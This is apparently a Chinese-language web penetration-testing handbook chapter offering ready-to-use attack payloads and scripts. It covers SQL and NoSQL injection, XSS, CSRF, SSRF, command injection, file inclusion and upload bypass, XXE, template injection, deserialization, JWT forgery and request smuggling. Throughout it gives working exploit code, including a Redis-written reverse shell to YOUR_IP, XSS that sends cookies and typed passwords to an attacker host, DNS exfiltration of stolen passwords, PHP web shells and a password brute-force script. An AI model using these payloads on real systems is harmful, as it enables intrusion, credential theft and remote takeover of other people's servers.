# 04-Web渗透深度实战

> **核心理念**：不讲废话，每一个漏洞都有完整Payload，每一条命令都是可直接操作的。


### 1.2 报错注入（Error-Based）

当结果不直接显示但SQL错误信息会显示时用。

**UpdateXML报错（MySQL 5.1+）**：
```
' AND updatexml(1,concat(0x7e,database()),1)-- 
' AND updatexml(1,concat(0x7e,(SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database())),1)-- 
' AND updatexml(1,concat(0x7e,(SELECT group_concat(column_name) FROM information_schema.columns WHERE table_name='users')),1)-- 
' AND updatexml(1,concat(0x7e,(SELECT password FROM users LIMIT 0,1)),1)-- 
```

**实战输入**：
```
http://target.com/page.php?id=1' AND updatexml(1,concat(0x7e,database()),1)--
```

**预期输出**：`XPATH syntax error: '~testdb'`

**ExtractValue报错**：
```
' AND extractvalue(1,concat(0x7e,database()))-- 
```

**双查询报错（经典floor报错）**：
```
' AND (SELECT 1 FROM (SELECT count(*),concat(database(),floor(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)-- 
# 想爆更多数据就把 database() 换成子查询
' AND (SELECT 1 FROM (SELECT count(*),concat((SELECT password FROM users LIMIT 0,1),floor(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)-- 
```

**PostgreSQL报错注入**：
```
' AND cast((SELECT current_database()) AS numeric)-- 
' AND 1=cast((SELECT string_agg(table_name,',') FROM information_schema.tables WHERE table_schema='public') AS int)--
```

**MSSQL报错注入**：
```
' AND 1=db_name()-- 
' AND 1=(SELECT TOP 1 name FROM sys.tables FOR XML PATH(''))-- 
```


### 1.4 时间盲注（Time-Based Blind）

连布尔差异都没有，只能用响应时间判断。

```
# MySQL时间盲注
' AND (SELECT sleep(5))--          → 延迟5秒=有注入
' AND if(1=1,sleep(5),0)--         → 布尔判断版
' AND (SELECT sleep(if((database()='test'),5,0)))-- 

# 逐字符猜解
' AND if((ascii(substring(database(),1,1)))>100,sleep(3),0)-- 
' AND if((ascii(substring((SELECT password FROM users LIMIT 0,1),1,1)))=97,sleep(3),0)-- 

# PostgreSQL时间盲注
' AND (SELECT CASE WHEN (current_database()='test') THEN pg_sleep(5) ELSE pg_sleep(0) END)-- 
'||pg_sleep(5)-- 

# MSSQL时间盲注
'; IF (1=1) WAITFOR DELAY '0:0:5'-- 
'; IF (ascii(substring((SELECT TOP 1 name FROM sysobjects),1,1)))>100 WAITFOR DELAY '0:0:3'-- 

# Oracle时间盲注
' AND (SELECT CASE WHEN (1=1) THEN dbms_pipe.receive_message(('a'),5) ELSE 0 END FROM dual)-- 
```

**实战操作**：
```
sqlmap -u "http://target.com/page.php?id=1" --technique=T --time-sec=3 --dump
```


### 1.6 OOB带外注入（Out-of-Band）

#### 1.6.1 MySQL DNS带外（Windows only, secure_file_priv为空）

```
# 先确认secure_file_priv
' UNION SELECT @@secure_file_priv-- 

# 读文件
' UNION SELECT load_file('\\\\',(SELECT @@version),'.YOUR_CEYE.io\\a.txt')-- 

# 爆库名
' UNION SELECT load_file(concat('\\\\',(SELECT database()),'.YOUR_CEYE.io\\a'))-- 

# 爆表名
' UNION SELECT load_file(concat('\\\\',(SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()),'.YOUR_CEYE.io\\a'))-- 

# 爆列名
' UNION SELECT load_file(concat('\\\\',(SELECT group_concat(column_name) FROM information_schema.columns WHERE table_name='users'),'.YOUR_CEYE.io\\a'))-- 

# 爆数据
' UNION SELECT load_file(concat('\\\\',(SELECT concat(username,':',password) FROM users LIMIT 0,1),'.YOUR_CEYE.io\\a'))-- 
```

**实战前提**：需要在 http://ceye.io 注册，获得一个子域名如 `abc123.ceye.io`。

**预期输出**：在CEYE的DNS查询记录中看到类似 `admin:e10adc3949ba59ab.abc123.ceye.io` 的域名解析请求。

#### 1.6.2 MSSQL OOB

```
'; DECLARE @a varchar(1024); SET @a='master..xp_dirtree "\\\\'+@@version+'.YOUR_CEYE.io\\a"'; EXEC(@a)-- 
```

#### 1.6.3 Oracle OOB

```
' UNION SELECT utl_http.request('http://YOUR_CEYE.io/'||(SELECT password FROM users WHERE rownum=1)) FROM dual-- 
```


### 2.2 MySQL读文件（LOAD_FILE）

```
# 读passwd
' UNION SELECT 1,LOAD_FILE('/etc/passwd'),3-- 

# 读主机信息
' UNION SELECT LOAD_FILE('/etc/hosts'),2,3-- 

# 读配置文件
' UNION SELECT LOAD_FILE('/var/www/html/config.php'),2,3--     # 源码会显示在页面中！
' UNION SELECT LOAD_FILE('/var/www/html/.env'),2,3-- 

# 读Windows文件
' UNION SELECT LOAD_FILE('C:/Windows/system.ini'),2,3-- 
' UNION SELECT LOAD_FILE('C:/inetpub/wwwroot/web.config'),2,3-- 

# 读Nginx配置找其他站点路径
' UNION SELECT LOAD_FILE('/etc/nginx/nginx.conf'),2,3-- 
' UNION SELECT LOAD_FILE('/etc/nginx/sites-enabled/default'),2,3-- 

# 读Apache配置
' UNION SELECT LOAD_FILE('/etc/apache2/sites-enabled/000-default.conf'),2,3-- 
' UNION SELECT LOAD_FILE('/etc/httpd/conf/httpd.conf'),2,3-- 

# 读MySQL自己的数据库文件（需要datadir路径）
' UNION SELECT LOAD_FILE('/var/lib/mysql/mysql/user.MYD'),2,3-- 
# 或直接用concat读取
' UNION SELECT CONCAT(LOAD_FILE('/var/lib/mysql/mysql/user.MYD')),2,3-- 
```


## 3. NoSQL注入

### 3.1 MongoDB认证绕过

```json
// 登录接口POST数据（Content-Type: application/json）
// 正常：{"username":"admin","password":"wrongpass"}
// 攻击：

// #1 永远为真绕过
{"username":{"$ne":null},"password":{"$ne":null}}
{"username":{"$ne":""},"password":{"$ne":""}}
{"username":{"$gt":""},"password":{"$gt":""}}

// #2 正则匹配爆破密码
{"username":"admin","password":{"$regex":"^a"}}
{"username":"admin","password":{"$regex":"^b"}}
{"username":"admin","password":{"$regex":"^ad"}}
// 如果返回"登录成功"，则该字符匹配，继续爆破
```

**curl实战**：
```bash
# 测试认证绕过
curl -X POST http://target.com/api/login \
  -H "Content-Type: application/json" \
  -d '{"username":{"$ne":null},"password":{"$ne":null}}'

# 正则爆破
curl -s http://target.com/api/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":{"$regex":"^a"}}' | grep -c 'success'
```

**Python自动爆破脚本**：
```python
import requests
import string

url = "http://target.com/api/login"
headers = {"Content-Type": "application/json"}
password = ""

while True:
    for c in string.printable:
        payload = {"username": "admin", "password": {"$regex": f"^{password}{c}"}}
        r = requests.post(url, json=payload, headers=headers)
        if "success" in r.text or "token" in r.text or r.status_code == 200:
            password += c
            print(f"[+] Found char: {password}")
            break
    else:
        break

print(f"[+] Password: {password}")
```


### 3.3 Redis注入

```bash
# 如果Redis暴露且无认证（默认端口6379）
redis-cli -h target.com
> keys *                    # 查看所有键
> get "keyname"             # 读取
> config get dir            # 查看持久化目录
> config get dbfilename     # 查看RDB文件名

# 写定时任务SSH密钥
redis-cli -h target.com
> config set dir /root/.ssh/
> config set dbfilename authorized_keys
> set key "\n\nssh-rsa AAAAB3... YOUR_KEY\n\n"
> save

# 写计划任务
redis-cli -h target.com
> config set dir /var/spool/cron/
> config set dbfilename root
> set key "\n\n*/1 * * * * bash -i >& /dev/tcp/YOUR_IP/4444 0>&1\n\n"
> save

# 写WebShell（需要知道绝对路径）
redis-cli -h target.com
> config set dir /var/www/html/
> config set dbfilename shell.php
> set key "<?php system($_GET['cmd']); ?>"
> save
```


### 4.2 存储型XSS（留言板注入）

```
# 在留言板内容中输入以下任一Payload提交
<script>fetch('http://YOUR_IP:8888/?cookie='+document.cookie)</script>

<!-- 短且隐蔽 -->
<img src=x onerror=this.src='http://YOUR_IP:8888/?c='+document.cookie>

<!-- 加载外部JS -->
<script src="http://YOUR_IP:8888/payload.js"></script>
```

**外部payload.js内容**：
```javascript
// payload.js — 挂在YOUR_VPS上
var x = new XMLHttpRequest();
x.open('GET', 'http://YOUR_IP:8888/?cookie='+encodeURIComponent(document.cookie)+'&url='+encodeURIComponent(location.href), true);
x.send();

// 劫持表单（记录管理员输入的旧密码）
var forms = document.querySelectorAll('input[type="password"]');
forms.forEach(function(f){
    f.addEventListener('change', function(){
        new Image().src = 'http://YOUR_IP:8888/?pwd='+encodeURIComponent(f.value);
    });
});
```


### 4.4 XSS绕过过滤

```html
<!-- ============ 绕过标签过滤 ============ -->
<!-- 如果过滤<script> -->
<img src=x onerror=alert(1)>
<img src="x" onerror="alert(1)">
<body onload=alert(1)>
<input onfocus=alert(1) autofocus>
<svg onload=alert(1)>
<details open ontoggle=alert(1)>
<video><source onerror=alert(1)>
<audio src=x onerror=alert(1)>
<marquee onstart=alert(1)>
<select onfocus=alert(1) autofocus>
<object data="data:text/html,<script>alert(1)</script>">

<!-- ============ 大小写混用 ============ -->
<ScRiPt>alert(1)</ScRiPt>
<IMG SRC=x OnErRoR=alert(1)>

<!-- ============ 双写绕过 ============ -->
<scr<script>ipt>alert(1)</scr</script>ipt>

<!-- ============ 编码绕过 ============ -->
<!-- HTML实体编码 -->
&#60;&#115;&#99;&#114;&#105;&#112;&#116;&#62;alert(1)&#60;&#47;&#115;&#99;&#114;&#105;&#112;&#116;&#62;

<!-- URL编码（用于URL参数中） -->
%3Cscript%3Ealert(1)%3C%2Fscript%3E

<!-- Base64编码（配合eval） -->
<script>eval(atob('YWxlcnQoMSk='))</script>
<!-- YWxlcnQoMSk= = alert(1) -->

<!-- JS Unicode编码 -->
<script>\u0061\u006c\u0065\u0072\u0074(1)</script>
<script>eval("\u0061\u006c\u0065\u0072\u0074\u0028\u0031\u0029")</script>

<!-- ============ 空格被过滤 ============ -->
<img/src=x/onerror=alert(1)>
<svg/onload=alert(1)>
<img src=x onerror=alert(1)>
<!-- 用 / 代替空格，或用换行符 %0a %0d -->
<img%0asrc=x%0aonerror=alert(1)>

<!-- ============ 引号被过滤 ============ -->
<img src=x onerror=alert(String.fromCharCode(49))>
<script>setTimeout(atob('YWxlcnQoMSk='))</script>

<!-- ============ 括号被过滤 ============ -->
<img src=x onerror=alert`1`>
<script>alert`1`</script>
<script>onerror=alert;throw 1</script>
<script>{onerror=alert}throw 1</script>

<!-- ============ alert被过滤 ============ -->
<script>prompt(1)</script>
<script>confirm(1)</script>
<img src=x onerror=prompt(1)>
<img src=x onerror=document.write('XSS')>

<!-- ============ 其他高级绕过 ============ -->
<!-- 利用location -->
<script>location='javascript:alert(1)'</script>
<script>location='data:text/html,<script>alert(1)<\/script>'</script>

<!-- 利用document.write + encodeURIComponent -->
<script>document.write(String.fromCharCode(60,115,99,114,105,112,116,62,97,108,101,114,116,40,49,41,60,47,115,99,114,105,112,116,62))</script>

<!-- 利用CSS -->
<style>body{background:url('javascript:alert(1)')}</style>
<div style="background-image: url(javascript:alert(1))">

<!-- 在属性中注入 -->
<a href="javascript:alert(1)">click</a>
<a onclick="alert(1)">click</a>
<input type="button" value="click" onclick="alert(1)">
<form action="javascript:alert(1)"><input type="submit"></form>
```


## 5. CSRF跨站请求伪造

### 5.1 GET请求CSRF

```html
<!-- 攻击者的钓鱼页面 (attacker.com/csrf.html) -->

<!-- 方法1：img标签 -->
<img src="http://target.com/change_email?email=attacker@evil.com" width="0" height="0">

<!-- 方法2：隐藏iframe -->
<iframe src="http://target.com/delete_account" style="display:none"></iframe>

<!-- 方法3：script标签 -->
<script src="http://target.com/api/transfer?to=attacker&amount=10000"></script>

<!-- 方法4：link标签 -->
<link rel="stylesheet" href="http://target.com/admin/delete_user?id=5">
```


### 5.3 Ajax CSRF（绕过简单验证）

```html
<html>
<body>
<script>
// 跨域POST（如果目标CORS配置宽松）
var xhr = new XMLHttpRequest();
xhr.open('POST', 'http://target.com/api/change_email', true);
xhr.withCredentials = true;  // 携带Cookie
xhr.setRequestHeader('Content-Type', 'application/json');
xhr.send('{"email":"attacker@evil.com"}');
</script>
</body>
</html>
```


## 6. SSRF深度实战

### 6.1 基本检测

```bash
# 如果目标有URL获取功能（如头像上传url=、代理?url=、图片获取?img=）
# 先在自己VPS上看能否收到请求

# 测试URL参数
http://target.com/proxy?url=http://YOUR_VPS_IP:8888/
http://target.com/fetch?src=http://127.0.0.1:80/
http://target.com/view?file=http://169.254.169.254/latest/meta-data/

# 在自己VPS监听
nc -lvnp 8888
```


### 6.3 内网端口扫描

```bash
# 根据响应时间/报错信息判断端口开放情况
# 手动测试常见端口
http://127.0.0.1:80/       # HTTP
http://127.0.0.1:8080/     # HTTP Alt
http://127.0.0.1:8443/     # HTTPS
http://127.0.0.1:6379/     # Redis
http://127.0.0.1:3306/     # MySQL
http://127.0.0.1:5432/     # PostgreSQL
http://127.0.0.1:27017/    # MongoDB
http://127.0.0.1:11211/    # Memcached
http://127.0.0.1:5000/     # Docker Registry
http://127.0.0.1:2375/     # Docker API
http://127.0.0.1:6379/     # Redis

# Burp Suite Intruder:
# 载荷：数字端口集合(21,22,80,443,445,1433,1521,3306,3389,5432,6379,8080,8443,9090,27017...)
# 判断依据：响应时间、报错内容不同
```


### 6.5 Gopher协议打内网服务

```bash
# Gopher协议可以构造任意TCP payload，常用于打内网未认证的服务

# ============ 打Redis ============
# 目标：内网Redis 6379，无认证
# 在Redis中写入SSH公钥：

# 第一步：构造Gopher payload
# Redis命令：flushall\nset key "ssh-rsa AAA...\n\n"\nconfig set dir /root/.ssh/\nconfig set dbfilename authorized_keys\nsave\n

# 第二步：URL编码 Redis命令（每个字符转成%XX）
gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$3%0d%0akey%0d%0a$390%0d%0a%0a%0assh-rsa%20AAA...%0a%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$11%0d%0a/root/.ssh/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$15%0d%0aauthorized_keys%0d%0a*1%0d%0a$4%0d%0asave%0d%0a

# ============ Gopher生成器（Python） ============
# 快速生成Redis写入SSH公钥的Gopher Payload
```

**Gopher Payload生成脚本（Python）**：
```python
#!/usr/bin/env python3
# gopher_redis_ssh.py

def redis_to_gopher(redis_cmds, host="127.0.0.1", port=6379):
    """将Redis命令列表转换为Gopher URL"""
    payload = ""
    for cmd in redis_cmds:
        payload += f"*{len(cmd)}\r\n"
        for arg in cmd:
            payload += f"${len(str(arg))}\r\n{arg}\r\n"
    
    # URL编码
    encoded = ""
    for char in payload:
        if char == '\n':
            encoded += '%0a'
        elif char == '\r':
            encoded += '%0d'
        elif char == ' ':
            encoded += '%20'
        elif char == '/':
            encoded += '%2f'
        else:
            encoded += char
    
    return f"gopher://{host}:{port}/_{encoded}"

# 用法示例
cmds = [
    ["flushall"],
    ["set", "key", "\n\nssh-rsa AAAAB3... YOUR_SSH_PUBKEY\n\n"],
    ["config", "set", "dir", "/root/.ssh/"],
    ["config", "set", "dbfilename", "authorized_keys"],
    ["save"]
]
print(redis_to_gopher(cmds))
```

**打MySQL**：
```
# Gopher MySQL: 需要构造MySQL握手包
# 用工具: https://github.com/tarunkant/Gopherus
python2 gopherus.py --exploit mysql
```


## 7. 命令注入

### 7.1 基本命令分隔符

```bash
# ============ Linux分隔符 ============
; ls -la                        # 分号分隔
| whoami                        # 管道
|| ping -c 5 127.0.0.1         # 前命令失败才执行
& ls                            # 后台执行
&& whoami                       # 前命令成功才执行
%0a id                          # 换行符编码
%0d%0a id                       # CRLF换行
`id`                            # 反引号命令替换
$(id)                           # Dollar命令替换
$(cat /etc/passwd)              # 读取文件

# ============ Windows分隔符 ============
| dir
|| dir
& dir
&& dir

# ============ 换行符注入（常见于HTTP Header） ============
%0a id
%0d%0a whoami
\n cat /etc/passwd
```


### 7.3 绕过过滤

```bash
# ============ 空格被过滤 ============
# 替代方案：
cat${IFS}/etc/passwd             # ${IFS} = Internal Field Separator
cat</etc/passwd                  # 输入重定向
{cat,/etc/passwd}                # 花括号
cat$IFS$9/etc/passwd             # $IFS$9
X=$'cat\x20/etc/passwd'&&$X     # hex编码空格
cat%09/etc/passwd                # 水平制表符

# ============ 关键字被过滤 ============
# cat被过滤：
/bin/cat /etc/passwd
/bin/c?t /etc/passwd
/bin/ca* /etc/passwd
c''a''t /etc/passwd
c"a"t /etc/passwd
c\at /etc/passwd
\143\141\164 /etc/passwd        # 八进制编码
/bin/c$(echo at) /etc/passwd

# 斜杠被过滤：
echo ${PATH:0:1}                # 输出 /
${HOME:0:1}cat${HOME:0:1}etc${HOME:0:1}passwd

# ============ 管道被过滤 ============
# 用输入重定向代替管道
grep root < /etc/passwd
# 用 -exec 代替
find / -name "passwd" -exec cat {} \;
```


## 8. LFI/RFI文件包含

### 8.1 本地文件包含 (LFI)

```bash
# 基础路径穿越
http://target.com/page.php?file=../../../../etc/passwd
http://target.com/page.php?file=....//....//....//etc/passwd  # 过滤../的绕过
http://target.com/page.php?file=....\/....\/....\/etc/passwd  # 过滤/的绕过
http://target.com/page.php?file=..%2f..%2f..%2f..%2fetc%2fpasswd  # URL编码
http://target.com/page.php?file=..%252f..%252f..%252f..%252fetc%252fpasswd  # 双层编码

# 绝对路径直接读
http://target.com/page.php?file=/etc/passwd
http://target.com/page.php?file=C:\Windows\system.ini

# 利用/proc/self/environ（环境变量中可能有User-Agent等信息）
# 第一步：修改User-Agent为 <?php system($_GET["cmd"]); ?>
# 第二步：读取 /proc/self/environ
http://target.com/page.php?file=/proc/self/environ

# 利用/proc/self/fd（文件描述符）
http://target.com/page.php?file=/proc/self/fd/0  # stdin
http://target.com/page.php?file=/proc/self/fd/1  # stdout
http://target.com/page.php?file=/proc/self/fd/12 # 可能是日志
```


### 8.3 日志文件包含→RCE

```bash
# ============ Apache/Nginx访问日志注入 ============

# Step 1: 通过HTTP请求将PHP代码写入日志
# 访问恶意URL，让服务器记录：
curl "http://target.com/<?php system(\$_GET['cmd']); ?>"
# 或通过User-Agent:
curl -A "<?php system(\$_GET['cmd']); ?>" http://target.com/

# 常见日志路径：
# Apache: /var/log/apache2/access.log, /var/log/httpd/access_log
# Nginx:  /var/log/nginx/access.log
# 自定义: /var/log/apache2/other_vhosts_access.log

# Step 2: LFI包含日志文件
http://target.com/page.php?file=/var/log/apache2/access.log&cmd=id
http://target.com/page.php?file=/var/log/nginx/access.log&cmd=id
http://target.com/page.php?file=../../../../var/log/apache2/access.log&cmd=whoami

# ============ SSH日志投毒 ============
# 如果有用户名枚举SSH
ssh '<?php system($_GET["cmd"]);?>'@target.com
# 日志路径: /var/log/auth.log

# ============ /proc/self/environ投毒 ============
# 通过User-Agent注入PHP代码
curl -H "User-Agent: <?php system(\$_GET['cmd']); ?>" http://target.com/
# 包含: ?file=/proc/self/environ&cmd=id
```


## 9. 文件上传绕过

### 9.1 后缀名绕过

```bash
# ============ 黑名单后缀绕过 ============
shell.php       → 被拦截
shell.php5      → php5也解析PHP
shell.phtml     → 如果Apache配置了解析
shell.pht       → 同phtml
shell.phar      → PHP Archive
shell.phps      → PHP源码显示
shell.shtml     → Server-Side Includes
shell.shtm
shell.php.jpg   → 双后缀（有些配置漏洞）
shell.php.jpeg  → 双后缀
shell.php%00.jpg → 空字节截断（PHP<5.3.4）
shell.php%00
shell.php.      → Windows下末尾点号会被去掉
shell.php::$DATA → Windows文件流
shell.pHp       → 大小写混用
shell.PHP
shell.asp;.jpg  → IIS6解析漏洞
shell.aspx;.jpg
shell.jpg/.php  → Nginx解析漏洞（未正确配置fastcgi）
shell.jpg%0d%0a.php → 换行绕过（Apache）

# ============ .htaccess覆盖（Apache）============
# 如果允许上传.htaccess文件：
# 上传的.htaccess内容：
AddType application/x-httpd-php .jpg
# 然后上传含有PHP代码的.jpg文件，它将被解析为PHP

# 更完整的.htaccess攻击：
<FilesMatch "evil">
    SetHandler application/x-httpd-php
</FilesMatch>
# 上传名为 evil 的文件，内含PHP代码

#  .user.ini（Nginx + PHP-FPM）
# 上传.user.ini:
auto_prepend_file=evil.jpg
auto_append_file=evil.jpg
# 上传evil.jpg：<?php system($_GET["cmd"]); ?>
# 之后访问同一目录下任何PHP文件都会包含evil.jpg
```


### 9.3 图片马制作及利用

```bash
# 方法1：直接拼接
echo '<?php system($_GET["cmd"]); ?>' >> image.jpg

# 方法2：exiftool注入
exiftool -DocumentName='<?php system($_GET["cmd"]); ?>' image.jpg
exiftool -Artist='<?php system($_GET["cmd"]); ?>' image.jpg

# 方法3：用GIMP等工具在图片EXIF注释中写PHP代码

# 方法4：完整PHP图片马（GIF89a头）
# 文件内容：
GIF89a
<?php
if(isset($_REQUEST['cmd'])){
    system($_REQUEST['cmd']);
}
?>
```


### 9.5 ZIP/压缩包上传

```bash
# 上传ZIP包含符号链接的（zip slip）
ln -s /etc/passwd passwd_link
zip --symlinks payload.zip passwd_link
# 上传后解压可能覆盖/etc/passwd或读取敏感文件

# 上传ZIP中包含PHP文件绕过
zip shell.zip shell.php
# 如果目标只检查上传时的文件类型
```


### 10.2 XXE→SSRF

```xml
<!-- 内网端口探测 -->
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://127.0.0.1:8080/">]>
<root>&xxe;</root>

<!-- 云元数据 -->
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>
<root>&xxe;</root>

<!-- 内网应用访问 -->
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://internal-admin.target.com/admin/">]>
<root>&xxe;</root>
```


### 10.4 XXE→RCE

```xml
<!-- expect:// 执行命令（如果装了expect模块） -->
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://id">]>
<root>&xxe;</root>

<!-- PHP中的phar://反序列化利用 -->
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "phar:///var/www/uploads/shell.jpg">]>
<root>&xxe;</root>
```


### 11.2 Jinja2 (Python) 深入利用

```python
# ============ 信息收集 ============
{{config}}                    # 输出Flask配置（含SECRET_KEY）
{{config.items()}}            # 遍历配置项
{{self.__class__.__mro__}}    # 查看类继承链
{{self.__class__.__mro__[1].__subclasses__()}}  # 查看所有子类
{{request}}                   # 查看请求对象
{{request.environ}}           # 环境变量
{{session}}                   # Session内容

# ============ RCE链1：利用os模块 ============
# 查找包含os或subprocess的类
{{''.__class__.__mro__[1].__subclasses__()}}
# 找到 <class 'subprocess.Popen'> 或 <class 'os._wrap_close'>

# 常见的RCE payload:
{{''.__class__.__mro__[1].__subclasses__()[X]}}
# 其中X是warnings.catch_warnings或其他可用类的索引

# 通过<class 'warnings.catch_warnings'> 获取 os:
{{''.__class__.__mro__[1].__subclasses__()[132].__init__.__globals__['popen']('id').read()}}

# ============ RCE链2：使用__builtins__ ============
{{''.__class__.__mro__[1].__subclasses__()[X].__init__.__globals__['__builtins__']['eval']('__import__("os").popen("id").read()')}}

# ============ RCE链3：利用config（仅Flask）============
{{config.from_object('os').popen('id').read()}}
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}

# ============ RCE链4：利用lipsum/lipsum ============
{{lipsum.__globals__['os'].popen('id').read()}}

# ============ 文件读取 ============
{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}
{{get_flashed_messages.__globals__.__builtins__.open('/etc/passwd').read()}}

# ============ 便捷查找子类索引脚本 ============
# 在目标机上运行，找出可用类的索引
# Jinja2模板中直接搜索:
{% for x in ().__class__.__base__.__subclasses__() %}
  {% if "warning" in x.__name__ %}{{ loop.index0 }}{% endif %}
{% endfor %}
```

**Jinja2自动RCE Payload生成器**：
```python
#!/usr/bin/env python3
# jinja2_rce_payload_gen.py
import requests

def generate_jinja2_payload(cmd):
    """生成Jinja2 RCE payload（多种尝试）"""
    payloads = [
        f"{{{{''.__class__.__mro__[2].__subclasses__()[40](__import__('os').popen('{cmd}').read())}}}}",
        f"{{{{self._TemplateReference__context.cycler.__init__.__globals__.os.popen('{cmd}').read()}}}}",
        f"{{{{lipsum.__globals__['os'].popen('{cmd}').read()}}}}",
        f"{{{{config.__class__.__init__.__globals__['os'].popen('{cmd}').read()}}}}",
        f"{{{{request.application.__self__._get_data_for_json.__builtins__['eval'](\"__import__('os').popen('{cmd}').read()\")}}}}",
    ]
    return payloads

# 使用示例
for p in generate_jinja2_payload("id"):
    print(p)
```


### 11.4 FreeMarker (Java) SSTI

```java
# 信息收集
${product.getClass().getProtectionDomain().getCodeSource().getLocation()}
${.version}

# RCE (FreeMarker 2.3)
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}

# 或者用ObjectConstructor
${"freemarker.template.utility.ObjectConstructor"?new()("java.lang.ProcessBuilder","whoami").start()}

# 文件读取
${"freemarker.template.utility.ObjectConstructor"?new()("java.io.FileReader","/etc/passwd")}
```


## 12. 反序列化攻击

### 12.1 PHP反序列化

```php
# 存在反序列化漏洞的代码：
# $data = unserialize($_GET['data']);

# 第一步：分析目标类，找到魔术方法(__wakeup, __destruct, __toString, __call等)

# 以Laravel为例的经典链：
# Payload生成

# 手动构造序列化字符串（假设已知类结构）:
# O:4:"User":2:{s:8:"username";s:5:"admin";s:8:"password";s:10:"hackedpass";}

# 更多实战Payload:
# O:8:"Example1":1:{s:4:"file";s:5:"/etc/passwd";}  (如果class Example1{public $file;function__destruct(){echo file_get_contents($this->file);}})

# 写文件
O:8:"Example2":1:{s:4:"data";s:35:"<?php system($_GET['cmd']); ?>";}  (如果__destruct中file_put_contents)

# 利用PHP原生类（无需目标类即可攻击）
# 使用 SoapClient 进行SSRF：
$a = new SoapClient(null, array('uri'=>'http://127.0.0.1/', 'location'=>'http://127.0.0.1:6379/'));
$b = serialize($a);
echo urlencode($b);

# PHPGGC生成各类框架的POP链
phpggc -l                            # 列出所有可用链
phpggc Laravel/RCE1 'id'             # Laravel RCE
phpggc Monolog/RCE1 'system' 'id'    # Monolog RCE
phpggc Guzzle/FW1 'whoami'           # Guzzle文件写入

# 实战用法
./phpggc Symfony/RCE4 'system' 'id' | base64
# 然后将base64解码后的payload传入反序列化参数
```


### 12.3 .NET反序列化

```bash
# 使用ysoserial.net
# https://github.com/pwntester/ysoserial.net

# 生成ViewState Payload
ysoserial.net -p ViewState -g ActivitySurrogateSelectorFromFile -c "msf.cs;System.dll;System.Web.dll"

# 生成ObjectDataProvider
ysoserial.exe -g ObjectDataProvider -f BinaryFormatter -c "calc" -o base64
```


## 13. JWT攻击

### 13.1 alg:none攻击

```bash
# JWT结构: header.payload.signature

# 正常JWT:
# header:  {"alg":"RS256","typ":"JWT"}
# payload: {"user":"admin","iat":1516239022}
# signature: HMACSHA256(base64UrlEncode(header)+"."+base64UrlEncode(payload), secret)

# alg:none攻击：将alg改为none，删除签名部分

# Step 1: 解码JWT（https://jwt.io 或命令行）
# Step 2: 修改 header → {"alg":"none","typ":"JWT"}
# Step 3: 修改 payload → {"user":"admin","role":"admin"}
# Step 4: 移除签名部分，只留 header.payload.
# Step 5: 发送修改后的JWT

# 手工操作示例：
# 原始JWT:
eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoidGVzdCJ9.xxx_signature

# 修改后的攻击JWT（注意最后保留 . 但无签名内容）:
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4ifQ.
# 解码验证:
# echo eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0 | base64 -d → {"alg":"none","typ":"JWT"}
# echo eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4ifQ | base64 -d → {"user":"admin","role":"admin"}
```


### 13.3 密钥混淆攻击（RS256→HS256）

```bash
# 如果服务端使用RS256（非对称），但错误地允许HS256（对称）
# 攻击者可以用公钥作为HS256的密钥来签名

# Step 1: 获取公钥（通常从 /.well-known/jwks.json 或 /jwks.json 获取）
curl http://target.com/.well-known/jwks.json
curl http://target.com/jwks.json
curl http://target.com/api/public_key

# Step 2: 用公钥作为HMAC密钥，alg改为HS256，签发任意JWT
python3 << 'EOF'
import jwt
import base64

# 假设获取到的公钥内容
public_key = open('public_key.pem').read()

# 用公钥作为HS256的secret签发admin JWT
token = jwt.encode(
    {"user": "admin", "role": "admin"},
    public_key,  # 用公钥作为对称密钥！
    algorithm="HS256"
)
print(token)
EOF

# 然后把生成的JWT发给服务端
```


## 14. HTTP请求走私 (Request Smuggling)

### 14.1 CL.TE 走私 (Content-Length vs Transfer-Encoding)

```http
# 前端服务器用Content-Length，后端用Transfer-Encoding

POST / HTTP/1.1
Host: vulnerable.com
Content-Length: 6
Transfer-Encoding: chunked

0

G
# G是走私的前缀请求的开始部分

# 完整CL.TE走私导致请求劫持：
POST / HTTP/1.1
Host: vulnerable.com
Content-Length: 44
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: vulnerable.com
Foo: bar
# 上面的GET /admin会被走私到下一个正常用户的请求之前
```

**复现步骤**：
```bash
# Step 1: 用Burp Repeater发送上面的CL.TE请求
# Step 2: 立即再发一个正常的GET请求
# Step 3: 观察第二个请求的响应——如果返回了/admin页面的内容，说明走私成功
```


### 14.3 TE.TE 走私（混淆Transfer-Encoding）

```http
POST / HTTP/1.1
Host: vulnerable.com
Content-Length: 4
Transfer-Encoding: chunked
Transfer-Encoding: xchunked   # 一个是障眼法！
Transfer-Encoding : chunked

5e
GET /admin HTTP/1.1
Host: vulnerable.com

0

# 前端和后端对哪个Transfer-Encoding有效产生分歧
```


## 15. Web Cache投毒

### 15.1 基本检测

```bash
# 原理：通过HTTP头注入让缓存服务器缓存恶意响应

# 测试头注入点
GET / HTTP/1.1
Host: target.com
X-Forwarded-Host: attacker.com
# 观察响应中是否有资源URL变成了 attacker.com

GET / HTTP/1.1
Host: target.com
X-Forwarded-Scheme: http
